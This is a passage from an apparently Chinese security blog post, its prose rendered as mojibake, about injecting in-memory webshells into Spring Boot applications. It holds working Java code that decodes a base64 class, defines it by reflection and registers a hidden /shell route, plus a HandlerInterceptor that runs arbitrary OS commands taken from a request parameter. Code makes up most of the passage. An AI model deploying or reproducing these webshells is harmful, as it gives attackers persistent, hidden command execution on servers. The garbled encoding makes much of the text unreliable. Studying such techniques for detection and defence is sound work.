IcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAVwcAbgcAVgcAXQcAawEAEE1ldGhvZFBhcmFtZXRlcnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABi9zaGVsbAEABm1ldGhvZAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDsBAANHRVQBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVzdENvbnRyb2xsZXI7DAAiACMBAARjb2RlBwBvDABwAHEHAHIMAHMAdAEAAAEAB29zLm5hbWUHAHUMAHYAcQwAdwB4AQADd2luDAB5AHoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHsBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAfAB9BwB+DAB/AIAMACIAgQEAAlxBDACCAIMMAIQAhQwAhgB4DACHACMHAG4MAIgAiQwAigAjDACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5b3JnL2Nsb3duL3NwcmluZ2Jvb3RtZW1vcnlzaGVsbC9jb250b3JsbGVyL1Rlc3RDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEAIAAhAAAAAAACAAEAIgAjAAEAJAAAAC8AAQABAAAABSq3AAGxAAAAAgAlAAAABgABAAAADgAmAAAADAABAAAABQAnACgAAAABACkAKgADACQAAAGoAAYACAAAALMrEgK5AAMCAE4suQAEAQA6BC3GAJMSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAwsEQGUuQAeAgCnAAROsQABAAAArgCxAB8AAwAlAAAASgASAAAAEgAJABMAEQAUABUAFQAZABcAKQAYAEcAGgBiAB0AeAAeAIwAHwCRACAAmAAhAJ0AIgCiACMApQAkAK4AKACxACYAsgApACYAAABcAAkARAADACsALAAGABkAiQAtAC4ABQBiAEAAKwAsAAYAeAAqAC8AMAAHAAkApQAxAC4AAwARAJ0AMgAzAAQAAACzACcAKAAAAAAAswA0ADUAAQAAALMANgA3AAIAOAAAACkACP4ARwcAOQcAOgcAOfwAGgcAO/wAJQcAPEEHADn4ABr5AAhCBwA9AAA+AAAACQIANAAAADYAAAA/AAAAGAABAEAAAgBBWwABcwBCAENbAAFlAEQARQACAEYAAAACAEcAPwAAAAYAAQBIAAA=&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>,d, <span class="hljs-number">0</span>, d.length&#125;);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).newInstance(), mm);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è®¿é—®helloè·¯ç”±çš„æ—¶å€™å°±èƒ½æˆåŠŸæ³¨å…¥å†…å­˜é©¬</p><p>å†å»è®¿é—®shellè·¯ç”±å°±èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><p><img src="https://cdn.clown2024.cn/image-20241113172717161.png" alt="image-20241113172717161"></p><blockquote><p>è¿™é‡Œçš„å®ç°è¦æ±‚æœåŠ¡å™¨ä¸Šå¾—æœ‰ä½ çš„æ¶æ„ç±»ï¼Œä¸ç„¶Class.forNameè¿™é‡Œå°±ä¼šæŠ¥é”™ï¼Œé—®äº†ä¸€ä¸‹kimiä»–ç»™å‡ºçš„ç†ç”±å¦‚ä¸‹ï¼š</p><ol><li><strong>ç±»åŠ è½½æœºåˆ¶</strong>ï¼š<ul><li>Javaçš„ç±»åŠ è½½æœºåˆ¶æ˜¯åŸºäºç±»åŠ è½½å™¨çš„ã€‚æ¯ä¸ªç±»åŠ è½½å™¨éƒ½æœ‰è‡ªå·±çš„ç±»åŠ è½½ç¼“å­˜ã€‚</li><li>å½“ä½ ä½¿ç”¨<code>Class.forName</code>æ—¶ï¼Œå®ƒä¼šå°è¯•ä»å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆ<code>Thread.currentThread().getContextClassLoader()</code>ï¼‰åŠ è½½ç±»ã€‚</li><li>å¦‚æœç±»æ˜¯é€šè¿‡<code>defineClass</code>æ–¹æ³•åŠ¨æ€åˆ›å»ºçš„ï¼Œå®ƒä¸ä¼šè¢«ä»»ä½•ç±»åŠ è½½å™¨çš„ç¼“å­˜ï¼Œå› æ­¤æ— æ³•é€šè¿‡<code>Class.forName</code>æ‰¾åˆ°ã€‚</li></ul></li><li><strong><code>defineClass</code>æ–¹æ³•</strong>ï¼š<ul><li><code>defineClass</code>æ–¹æ³•æ˜¯<code>ClassLoader</code>ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºåŠ¨æ€åˆ›å»ºç±»ã€‚</li><li>é€šè¿‡<code>defineClass</code>åˆ›å»ºçš„ç±»ä¸ä¼šè¢«ç±»åŠ è½½å™¨çš„ç¼“å­˜ï¼Œå› æ­¤æ— æ³•é€šè¿‡å¸¸è§„çš„ç±»åŠ è½½æœºåˆ¶æ‰¾åˆ°ã€‚</li></ul></li></ol></blockquote><p>åæ¥åœ¨kimiçš„å¸®åŠ©ä¸‹æ”¹æˆè¿™æ ·å°±å¯ä»¥äº†ï¼Œå°±ä¸ç”¨Class.forNameï¼Œç›´æ¥è®©ä»–invokeçš„æ—¶å€™å¼ºè½¬æˆClasså°±å¯ä»¥ç”¨äº†</p><p>ä¿®æ”¹åçš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, instance, mm);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject Successful!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="interceptorå†…å­˜é©¬"><a href="#Interceptorå†…å­˜é©¬" class="headerlink" title="Interceptorå†…å­˜é©¬"></a>Interceptorå†…å­˜é©¬</h1><p>Interceptoræ˜¯springMvcçš„ç»„ä»¶ï¼Œæ‰€ä»¥ä»–åªä½œç”¨äºSpring MVCçš„è¯·æ±‚å¤„ç†æµç¨‹ï¼Œåªå¤„ç†é€šè¿‡Spring MVCçš„è¯·æ±‚</p><p>æ‰€ä»¥ä»–å’Œå…¶ä»–ç»„ä»¶ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼š</p><p><code>Filter</code>å’Œ<code>Listener</code>åœ¨Servletå®¹å™¨ä¸­é…ç½®ï¼Œé€šå¸¸åœ¨<code>web.xml</code>æ–‡ä»¶ä¸­æˆ–é€šè¿‡æ³¨è§£é…ç½®ã€‚</p><p><code>Interceptor</code>åœ¨Spring MVCä¸­é…ç½®ï¼Œé€šå¸¸åœ¨Springçš„é…ç½®æ–‡ä»¶æˆ–é…ç½®ç±»ä¸­ã€‚</p><ul><li><strong>æ‰§è¡Œé¡ºåº</strong>ï¼š<ul><li><code>Filter</code>åœ¨<code>Interceptor</code>ä¹‹å‰æ‰§è¡Œï¼Œå› ä¸º<code>Filter</code>åœ¨è¯·æ±‚åˆ°è¾¾Servletä¹‹å‰å°±å·²ç»æ‰§è¡Œã€‚</li><li><code>Interceptor</code>åœ¨<code>Filter</code>ä¹‹åã€Controllerä¹‹å‰æ‰§è¡Œã€‚</li><li><code>Listener</code>åœ¨åº”ç”¨å¯åŠ¨ã€å…³é—­ã€ä¼šè¯åˆ›å»ºã€é”€æ¯æ—¶æ‰§è¡Œï¼Œä¸è¯·æ±‚å¤„ç†æµç¨‹æ— å…³ã€‚</li></ul></li></ul><p>y4å¸ˆå‚…çš„æ–‡ç« ä¸­æ€»ç»“çš„è¯·æ±‚åˆ°è¾¾Controllerçš„é¡ºåºï¼š</p><p>HttpRequest â€“&gt; Filter â€“&gt; DispactherServlet â€“&gt; Interceptor â€“&gt; Aspect â€“&gt; Controller</p><h2 id="interceptorç¼–å†™"><a href="#Interceptorç¼–å†™" class="headerlink" title="Interceptorç¼–å†™"></a>Interceptorç¼–å†™</h2><p>å…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„interceptorï¼Œå’Œä¸Šé¢çš„controllerä¸€æ ·å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå†è¿›è¡Œæ·»åŠ æ³¨å†Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.configure;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;<br>        registry.addInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestInterceptor</span>()).addPathPatterns(<span class="hljs-string">&quot;/hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113202533221.png" alt="image-20241113202533221"></p><h2 id="interceptoræµç¨‹"><a href="#Interceptoræµç¨‹" class="headerlink" title="Interceptoræµç¨‹"></a>Interceptoræµç¨‹</h2><p>emmmæˆ‘æœ¬èº«æ‰“ç®—é…ç½®ç±»å¤„æ‰“ä¸ªæ–­ç‚¹åˆ†æinterceptorçš„æ³¨å†Œæµç¨‹ï¼Œä½†æ˜¯çœ‹æ–‡ç« éƒ½æ˜¯ä»å¤„ç†è¯·æ±‚çš„æµç¨‹æ¥åˆ†æçš„ï¼Œä¼°è®¡æ˜¯å¦‚æœè¦åŠ¨æ€æ³¨å†Œçš„è¯æˆ‘ä»¬åº”è¯¥æ˜¯èµ°ä¸åˆ°é…ç½®ç±»çš„æ‰‹åŠ¨addInterceptorçš„åœ°æ–¹å—ğŸ¤”</p><p>å…ˆæŒ‰ç€ç½‘ä¸Šçš„æ€è·¯æ¥å§ï¼Œè¿™ä¸ªç‚¹åˆ°æ—¶æœ‰ç©ºçš„è¯ç ”ç©¶ä¸€ä¸‹ğŸ«¡</p><p>é‚£å°±ç›´æ¥åœ¨preHandleä¸‹ä¸ªæ–­ç‚¹</p><p><img src="https://cdn.clown2024.cn/image-20241113213033793.png" alt="image-20241113213033793"></p><p>ç„¶åçœ‹çœ‹è°ƒç”¨æ ˆï¼Œå…¶ä¸­åœ¨DispatcherServlet#doDispatchæ–¹æ³•é‡Œé¢çœ‹åˆ°äº†å¤„ç†æˆ‘ä»¬PreHandleæ–¹æ³•çš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241113213305476.png" alt="image-20241113213305476"></p><p>è¿™ä¸ªapplyPreHandleæ–¹æ³•å¾ˆæ˜æ˜¾å°±æ˜¯å¤„ç†æˆ‘ä»¬PreHandleçš„æ–¹æ³•ï¼Œä»è¿”å›å€¼ä¹Ÿå¯ä»¥æ¨å‡ºï¼Œå› ä¸ºæˆ‘ä»¬PreHandleè¿”å›çš„ä¹Ÿæ˜¯å¸ƒå°”å€¼</p><p>ä»å›¾ä¸­çš„å˜é‡å€¼å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„interceptorå°±åœ¨è¿™ä¸ªmappedHandlerå˜é‡å½“ä¸­</p><p><img 